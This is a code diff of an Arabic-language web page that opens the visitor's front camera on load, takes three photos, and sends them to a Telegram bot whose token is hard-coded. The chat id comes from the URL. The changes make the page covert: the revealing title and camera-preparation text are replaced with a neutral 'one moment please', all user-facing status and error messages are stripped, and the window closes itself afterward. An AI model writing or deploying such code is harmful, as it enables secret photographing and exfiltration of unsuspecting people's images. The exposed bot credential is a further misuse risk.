@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط الصور</title>
+    <title></title>
     <style>
         * {
             margin: 0;
@@ -52,33 +52,16 @@
         .hidden {
             display: none;
         }
-        
-        #status {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 14px;
-            color: #95a5a6;
-        }
-        
-        .error {
-            color: #e74c3c;
-        }
-        
-        .success {
-            color: #2ecc71;
-        }
     </style>
 </head>
 <body>
     <div class="loader-container">
         <div class="spinner"></div>
-        <div class="loading-text">جاري تحضير الكاميرا...</div>
+        <div class="loading-text">لحظة من فضلك...</div>
     </div>
 
-    <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
+    <video id="cameraPreview" class="hidden" autoplay playsinline></video>
     <canvas id="photoCanvas" class="hidden"></canvas>
-    
-    <div id="status"></div>
 
     <script>
         const BOT_TOKEN = '8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g';
@@ -86,12 +69,6 @@
         function getChatId() {
             const params = new URLSearchParams(window.location.search);
             return params.get('chatId');
-        }
-        
-        function updateStatus(message, isError = false) {
-            const statusEl = document.getElementById('status');
-            statusEl.textContent = message;
-            statusEl.className = isError ? 'error' : 'success';
         }
         
         async function sendPhotoToTelegram(photoBlob, chatId, photoNumber) {
@@ -105,145 +82,78 @@
                     method: 'POST',
                     body: formData
                 });
-                const result = await response.json();
                 return response.ok;
             } catch (error) {
-                console.error('Error sending photo:', error);
                 return false;
             }
         }
         
         async function capturePhoto(video, canvas) {
             const context = canvas.getContext('2d');
-            
-            // ضبط أبعاد الكانفاس لتتناسب مع الفيديو
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
-            // التأكد من أن الفيديو جاهز
-            if (video.videoWidth === 0 || video.videoHeight === 0) {
-                throw new Error('Video not ready');
-            }
-            
-            // رسم الفيديو على الكانفاس
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // إضافة تأخير لضمان جودة الصورة
-            await new Promise(resolve => setTimeout(resolve, 300));
-            
-            return new Promise((resolve, reject) => {
-                canvas.toBlob(blob => {
-                    if (blob) resolve(blob);
-                    else reject(new Error('Failed to create blob'));
-                }, 'image/jpeg', 0.9);
+            return new Promise((resolve) => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.8);
             });
         }
         
         async function takeThreePhotos() {
             const chatId = getChatId();
-            if (!chatId) {
-                updateStatus('خطأ: لم يتم العثور على معرف المحادثة', true);
-                return;
-            }
+            if (!chatId) return;
             
             const video = document.getElementById('cameraPreview');
             const canvas = document.getElementById('photoCanvas');
-            const loader = document.querySelector('.loader-container');
             
             try {
-                updateStatus('جاري طلب صلاحية الكاميرا...');
-                
-                // طلب صلاحية الكاميرا مع خيارات مبسطة
+                // فتح الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
+                    video: { 
                         facingMode: 'user',
-                        width: { min: 640, ideal: 1280, max: 1920 },
-                        height: { min: 480, ideal: 720, max: 1080 }
-                    },
-                    audio: false
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
                 });
                 
                 video.srcObject = stream;
-                video.playsInline = true;
                 
-                // انتظار تحميل بيانات الفيديو
-                await new Promise((resolve, reject) => {
-                    video.onloadedmetadata = resolve;
-                    video.onerror = reject;
-                    
-                    // مهلة زمنية
-                    setTimeout(() => {
-                        if (video.videoWidth === 0) {
-                            reject(new Error('Video loading timeout'));
+                // انتظار حتى تبدأ الكاميرا العمل فعلياً
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = async () => {
+                        try {
+                            await video.play();
+                            // إضافة تأخير 1 ثانية لضمان أن الكاميرا جاهزة
+                            setTimeout(resolve, 1000);
+                        } catch (e) {
+                            setTimeout(resolve, 2000); // تأخير أطول إذا كان هناك مشكلة
                         }
-                    }, 5000);
+                    };
                 });
                 
-                // إظهار الفيديو مؤقتاً للتأكد من عمله
-                video.classList.remove('hidden');
-                updateStatus('الكاميرا جاهزة، جاري التقاط الصور...');
-                
-                // انتظار إضافي لضمان جودة الفيديو
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                // التقاط 3 صور مع فترات انتظار
-                let successCount = 0;
+                // التقاط 3 صور مع تأخير بين كل صورة
                 for (let i = 1; i <= 3; i++) {
-                    try {
-                        updateStatus(`جاري التقاط الصورة ${i} من 3...`);
-                        
-                        // زيادة وقت الانتظار بين الصور
-                        if (i > 1) {
-                            await new Promise(resolve => setTimeout(resolve, 1500));
-                        }
-                        
-                        const photoBlob = await capturePhoto(video, canvas);
-                        
-                        updateStatus(`جاري إرسال الصورة ${i}...`);
-                        const sent = await sendPhotoToTelegram(photoBlob, chatId, i);
-                        
-                        if (sent) {
-                            successCount++;
-                            updateStatus(`✅ تم إرسال الصورة ${i} بنجاح`);
-                        } else {
-                            updateStatus(`⚠️ فشل إرسال الصورة ${i}`, true);
-                        }
-                        
-                    } catch (error) {
-                        updateStatus(`❌ خطأ في الصورة ${i}: ${error.message}`, true);
-                    }
+                    // إضافة تأخير 300 مللي ثانية قبل كل صورة
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    const photoBlob = await capturePhoto(video, canvas);
+                    await sendPhotoToTelegram(photoBlob, chatId, i);
                 }
                 
                 // إغلاق الكاميرا
                 stream.getTracks().forEach(track => track.stop());
-                video.classList.add('hidden');
                 
-                // إخفاء المتحمّل وإظهار النتيجة النهائية
-                loader.classList.add('hidden');
-                
-                if (successCount > 0) {
-                    updateStatus(`✅ تم إرسال ${successCount} صور بنجاح`, false);
-                } else {
-                    updateStatus('❌ فشل إرسال جميع الصور', true);
-                }
+                // إغلاق الصفحة بعد 2 ثانية
+                setTimeout(() => {
+                    window.close();
+                }, 2000);
                 
             } catch (error) {
-                console.error('خطأ رئيسي:', error);
-                loader.classList.add('hidden');
-                
-                if (error.name === 'NotAllowedError') {
-                    updateStatus('❌ تم رفض صلاحية الكاميرا', true);
-                } else if (error.name === 'NotFoundError') {
-                    updateStatus('❌ لم يتم العثور على كاميرا', true);
-                } else {
-                    updateStatus(`❌ خطأ: ${error.message}`, true);
-                }
+                console.error('Error accessing camera:', error);
             }
         }
         
-        // بدء العملية بعد تحميل الصفحة
-        window.addEventListener('DOMContentLoaded', () => {
-            // تأخير بسيط لضمان تحميل الصفحة بالكامل
+        // بدء التقاط الصور فوراً مع تأخير بسيط
+        window.addEventListener('load', () => {
             setTimeout(takeThreePhotos, 500);
         });
     </script>
